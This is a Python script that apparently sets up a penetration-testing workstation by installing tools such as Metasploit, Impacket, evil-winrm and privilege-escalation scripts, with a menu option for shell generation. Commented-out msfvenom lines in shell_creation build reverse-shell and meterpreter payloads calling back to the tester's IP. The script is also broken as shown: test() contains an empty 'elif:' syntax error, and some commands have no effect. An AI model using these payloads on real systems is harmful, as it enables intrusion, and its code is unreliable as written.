#! /usr/bin/python3

import os
from simple_term_menu import TerminalMenu
from termcolor import colored

# Maybe sometime later we'll take this and make a separate file, but for now, I want everything in
## one single executable file


#### !!! Consider creating an empty array that we append the finished software to once it has been installed
#TODO: Make this less error prone - some linux flavors don't have /home at the root
#TODO: Check to make sure we're in the Downloads directory before installs & downloads - otherwise bail
#TODO: Grab the neo4j database info, make sure its running and provide to user
#TODO: Grab the neo4j webserver & the associated port ---> netstat -tano | grep -i "7474"
#TODO: Adjust the dir/file checks to local, rather than abspath
#TODO: Use a list of github repos and iterate through them, rather than this mess
#TODO: Install assetfinder
#TODO: After install, rename the privilege-escalation-suite dir to PEAS
#TODO: Ensure that the Metasploit database service is up & running, provide info to the user
#TODO: Maybe do a search to check if any errors or packages werent able to be added during the script
#TODO: Separate the function creations into its own python file and import them
# sudo systemctl start postgresql
# <check to ensure the service is running now>
# msfdb init

#ADD APT PACKAGES TO ME
#TODO: Update software to grab
apt_packages = ['seclists','gobuster','metasploit-framework',
                'crackmapexec','snmpcheck','enum4linux','smbmap','wfuzz','sublime-text',
                'yersinia','bloodhound','subfinder','tilix']

githubs = ['https://github.com/0v3rride/Enum4LinuxPy','https://github.com/RUB-NDS/PRET','https://github.com/nccgroup/vlan-hopping.git',
            'https://github.com/HackPlayers/evil-winrm','https://github.com/SecureAuthCorp/Impacket','https://github.com/21y4d/nmapAutomator',
            'https://github.com/vulnersCom/nmap-vulners']

gitfolders = ['Enum4LinuxPy','PRET','vlan-hopping','evil-winrm','Impacket','nmapAutomator']

#ADD PyPi PACLAGES TO ME
pypi_packages = ['one-lin3r','ptftpd','bloodhound','colorama','pysnmp']

sublime = 'deb https://download.sublimetext.com/ apt/stable/'
user = os.getlogin()

# This grabs the IP address of tun0 and uses it to start generating malicious binaries
## TODO: Create a method to select what interface you want to use
# ip_addr = os.popen('ip addr show tun0 | grep "\\<inet\\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
# This port is used for malicious binary generation
# listen_port = 6969

def system_update():
    #os.system(f"cd /opt/")
    os.system("/opt")
    print(colored("Beginning System updates, please wait...", 'blue'))
    # This isn't a system tool, but it's a quickfix for now
    sublime_download()
    os.system('sudo apt install python3-pip -y')
    os.system('sudo apt update -y')
    os.system('sudo apt upgrade -y')
    os.system('sudo apt upgrade -y')
    os.system('sudo apt autoremove -y')
    print(colored("Finished SYSTEM setup", 'green'))
    return()

def sublime_download():
    os.system('wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg\
                | sudo apt-key add -')
    os.system('sudo apt-get install apt-transport-https')
    os.system(f'echo {sublime} | sudo tee /etc/apt/sources.list.d/sublime-text.list')

def install_go():
    if os.path.exists(f'/usr/local/go') and os.path.exists(f'/opt/go/bin/assetfinder'):
        print(colored('GO already is installed at /usr/local/go, continuing...', 'green'))
    else:
        os.system('wget https://golang.org/dl/go1.16.3.linux-amd64.tar.gz')
        os.system('sudo rm -rf /usr/local/go && tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz')
        os.system('export PATH=$PATH:/usr/local/go/bin')
        os.system('source $HOME/.profile && go version')
        print('Attempting to utilize GO to grab & install assetfinder now...\n')
        os.system('go get -u github.com/tomnomnom/assetfinder')
        print(colored('If we have gotten to here, this is a good sign....', 'red'))

def new_software_check():
    """ New and improved(?) software_check method """
    if not os.path.exists("/usr/local/bin/one-lin3r"):
        os.system(f"sudo ln -s /opt/.local/bin/one-lin3r /usr/local/bin")
    else:
        print(colored("one-lin3r already exists in /usr/local/bin already exists in /usr/local/bin, continuing...\n", 'green'))

def software_check():
    os.system("cd /opt")
#    if not os.path.exists("/usr/local/bin/one-lin3r"):
#        os.system(f"sudo ln -s /opt/.local/bin/one-lin3r /usr/local/bin")
#    else:
#        print(colored("one-lin3r already exists in /usr/local/bin already exists in /usr/local/bin, continuing...\n", 'green'))

    if os.path.exists(f"/opt/nmap-vulners"):
        os.system(f'sudo cp /opt/nmap-vulners/vulners.nse /usr/share/nmap/scripts/vulners.nse')
        print(colored("nmap-vulners already installed, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/vulnersCom/nmap-vulners')
        if not os.path.exists('/usr/share/nmap/scripts/vulners.nse'):
            os.system(f'sudo cp /opt/nmap-vulners/vulners.nse /usr/share/nmap/scripts/vulners.nse')
        else:
            print(colored("vulners.nse has been downloaded and copied into the nmap scripts DB", 'green'))

    if os.path.exists(f'/opt/nmapAutomator'):
        print(colored("nmapAutomator already installed, continuing...", 'green'))
        if not os.path.exists('/usr/local/bin/nmapAutomator.sh'):
            os.system(f'sudo ln -s /opt/nmapAutomator/nmapAutomator.sh /usr/local/bin/')
        else:
            print(colored("Already have nmapAutomator in local binaries, continuing...\n", 'green'))
    else:
        os.system('sudo git clone https://github.com/21y4d/nmapAutomator')
        os.system(f'chmod +x /opt/nmapAutomator/nmapAutomator.sh')
        print(colored('nmapAutomator is now dynamically executable', 'green'))


    if os.path.exists(f'/opt/Impacket'):
        print(colored("Impacket is already installed, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/SecureAuthCorp/Impacket')

# This no longer works, we need to physically grab the releases of the specific scripts
# https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh
# https://github.com/carlospolop/PEASS-ng/releases/download/20220703/winPEAS.bat
# https://github.com/carlospolop/PEASS-ng/releases/download/20220703/winPEASany.exe

    if os.path.exists(f'/opt/privilege-escalation-awesome-scripts-suite'):
        print(colored("LinPEAS & WinPEAS already installed, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite')


    if os.path.exists('/usr/local/bin/LinEnum.sh'):
        print(colored("LinEnum already installed, continuing...\n", 'green'))
    else:
        os.system(f'wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\
                    -O /opt/LinEnum.sh')
        os.system(f'sudo ln -s /opt/LinEnum.sh /usr/local/bin/')

    if os.path.exists(f'/opt/evil-winrm'):
        print(colored("evil-winRM already installed, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/HackPlayers/evil-winrm')


    if os.path.exists(f'/opt/Enum4LinuxPy'):
        print(colored("Enum4LinuxPy already installed, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/0v3rride/Enum4LinuxPy')


    if os.path.exists(f'/opt/vlan-hopping'):
        print(colored("VLAN-Hopping already installed, continuing...", 'green'))
    else:
        os.system('git clone https://github.com/nccgroup/vlan-hopping.git')

        ### TOOL UPDATES & SETUPS ###
    print('Updating searchsploit DB....\n')
    os.system('sudo searchsploit -u')
    print(colored("Finished searchsploit update", 'green'))
    print("Updating locate DB...\n")
    os.system('sudo updatedb')
    print(colored("Finished locate DB update \n", 'green'))
    print("Updating nmap script database\n")
    os.system('sudo nmap --script-updatedb')
    print(colored('nmap script database updated \n', 'green'))

    print("Checking if rockyou has been unzipped...")
    if os.path.isfile('/usr/share/wordlists/rockyou.txt.gz'):
        print("It hasn't been decompressed - decompressing now...\n")
        os.system('sudo gunzip /usr/share/wordlists/rockyou.txt.gz')
    else:
        print(colored("rockyou has already been unzipped \n", 'green'))

    print(colored("Software & Tool updates have been completed!", 'green'))
    return()
    #### END TOOL UPDATES & SETUPS ####

def software_update():
    os.system(f"cd /opt/")
    print(colored("Beginning Software install(s) & updates, please wait...\n ", 'blue'))
    for pkg in apt_packages:
        os.system(f'sudo apt install {pkg} -y')
        os.system('sudo apt install -y')

    for pkg in pypi_packages:
        os.system(f'pip3 install {pkg}')
    os.system('sudo mkdir -p /usr/share/neo4j/logs')
    os.system('sudo touch /usr/share/neo4j/logs/neo4j.log')
    os.system('sudo neo4j start')
    # Now dump/grab the port/service info for neo4j and give to the user
    tool_init()
"""
    ### BEGIN IF/ELSE CHECKS FOR SOFTWARE ####
# TODO: We can probably use parameter expansion and iterate through the list rather than check these things individually

    if not os.path.exists("/usr/local/bin/one-lin3r"):
        os.system(f"sudo ln -s /opt/.local/bin/one-lin3r /usr/local/bin")
    else:
        print(colored("one-lin3r already exists in /usr/local/bin already exists in /usr/local/bin, continuing...\n", 'green'))

    if os.path.exists(f"/opt/nmap-vulners"):
        os.system(f'sudo cp /opt/nmap-vulners/vulners.nse /usr/share/nmap/scripts/vulners.nse')
        print(colored("nmap-vulners already installed, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/vulnersCom/nmap-vulners')
        if not os.path.exists('/usr/share/nmap/scripts/vulners.nse'):
            os.system(f'sudo cp /opt/nmap-vulners/vulners.nse /usr/share/nmap/scripts/vulners.nse')
        else:
            print(colored("vulners.nse has been downloaded and copied into the nmap scripts DB", 'green'))

    if os.path.exists(f'/opt/nmapAutomator'):
        print(colored("nmapAutomator already installed, continuing...", 'green'))
        if not os.path.exists('/usr/local/bin/nmapAutomator.sh'):
            os.system(f'sudo ln -s /opt/nmapAutomator/nmapAutomator.sh /usr/local/bin/')
        else:
            print(colored("Already have nmapAutomator in local binaries, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/21y4d/nmapAutomator')
        os.system(f'chmod +x /opt/nmapAutomator/nmapAutomator.sh')
        print(colored('nmapAutomator is now dynamically executable', 'green'))


    if os.path.exists(f'/opt/Impacket'):
        print(colored("Impacket is already installed, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/SecureAuthCorp/Impacket')

    if os.path.exists(f'/opt/privilege-escalation-awesome-scripts-suite'):
        print(colored("LinPEAS & WinPEAS already installed, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite')


    if os.path.exists('/usr/local/bin/LinEnum.sh'):
        print(colored("LinEnum already installed, continuing...\n", 'green'))
    else:
        os.system(f'wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\
                    -O /opt/LinEnum.sh')
        os.system(f'sudo ln -s /opt/LinEnum.sh /usr/local/bin/')

    if os.path.exists(f'/opt/evil-winrm'):
        print(colored("evil-winRM already installed, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/HackPlayers/evil-winrm')


    if os.path.exists(f'/opt/Enum4LinuxPy'):
        print(colored("Enum4LinuxPy already installed, continuing...\n", 'green'))
    else:
        os.system('git clone https://github.com/0v3rride/Enum4LinuxPy')


    if os.path.exists(f'/opt/vlan-hopping'):
        print(colored("VLAN-Hopping already installed, continuing...", 'green'))
    else:
        os.system('git clone https://github.com/nccgroup/vlan-hopping.git')

    if os.path.exists(f'/usr/local/go') and os.path.exists(f'/opt/go/bin/assetfinder'):
        print(colored('GO already is installed at /usr/local/go, continuing...', 'green'))
    else:
        os.system('wget https://golang.org/dl/go1.16.3.linux-amd64.tar.gz')
        os.system('sudo rm -rf /usr/local/go && tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz')
        os.system('export PATH=$PATH:/usr/local/go/bin')
        os.system('source $HOME/.profile && go version')
        print('Attempting to utilize GO to grab & install assetfinder now...\n')
        os.system('go get -u github.com/tomnomnom/assetfinder')
        print(colored('If we have gotten to here, this is a good sign....', 'red'))

        #### END IF ELSE CHECKS #####

    ### TOOL UPDATES & SETUPS ###
    print('Updating searchsploit DB....\n')
    os.system('sudo searchsploit -u')
    print(colored("Finished searchsploit update", 'green'))
    print("Updating locate DB...\n")
    os.system('sudo updatedb')
    print(colored("Finished locate DB update \n", 'green'))
    print("Updating nmap script database\n")
    os.system('sudo nmap --script-updatedb')
    print(colored('nmap script database updated \n', 'green'))



    print("Checking if rockyou has been unzipped...")
    if os.path.isfile('/usr/share/wordlists/rockyou.txt.gz'):
        print("It hasn't been decompressed - decompressing now...\n")
        os.system('sudo gunzip /usr/share/wordlists/rockyou.txt.gz')
    else:
        print(colored("rockyou has already been unzipped \n", 'green'))

    print(colored("Software & Tool updates have been completed!", 'green'))
    return()
    #### END TOOL UPDATES & SETUPS ####

"""

def tool_init():
    os.system('sudo systemctl start postgresql')
    os.system('systemctl status postgresql')
    os.system('sudo msfdb init')


def shell_creation():
    #ip_addr = os.popen('ip addr show eth0 | grep "\\<inet\\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
    #listen_port = 6969
    print(f"Interface address is: {ip_addr}")
    print(f"Port being used for shells is {listen_port}")
    print("                           Nice")
    #os.system(f'msfvenom -p linux/x64/shell_reverse_tcp RHOST={ip_addr} LPORT={listen_port} -f elf > /tmp/test.elf')
    #os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip_addr} LPORT={listen_port} -f elf > /tmp/test.elf')
    #os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_addr} LPORT={listen_port} -f exe > /tmp/test.exe')
    print("Did I work? doubtful!")


def test():
    """
    for i in apt_packages:
        print(colored(f"Installing: {i}", 'blue'))
        os.system(f"sudo apt install {i}")
    """
    print("Checking if a list of things exist...")
    for i in gitfolders:
        if os.path.exists(f'/opt/{i}'):
            print(colored(f"{i} already installed, continuing...\n", 'green'))
        elif:

        else:
            print(colored(f"The software {i} either failed to be detected or doesn't exist", "red"))


def terminal_selection():
    main_menu_title = "Automated Kit Buildout Script, Select ALL, TOOLS, or SHELL \n"
    main_menu_cursor = "-> "

    options = ["ALL", "TOOLS", "SHELL", "TEST"]
    # begin TUI Custom configuration(s)
    terminal_menu = TerminalMenu(
        options,
        title=main_menu_title,
        menu_cursor=main_menu_cursor)
    menu_entry_index = terminal_menu.show()

    user_selection = {options[menu_entry_index]}
    if menu_entry_index == 0:
        print(("Match Successful on ALL"))
        system_update()
        software_update()
    elif menu_entry_index == 1:
        print("Match successful on TOOLS")
        #software_update()
        software_check()
        install_go()
    elif menu_entry_index == 2:
        print("Match successful on SHELL")
        shell_creation()
    elif menu_entry_index == 3:
        test()
    else:
        print("Match failed again")

def main():
    terminal_selection()

if __name__ == "__main__":
    main()
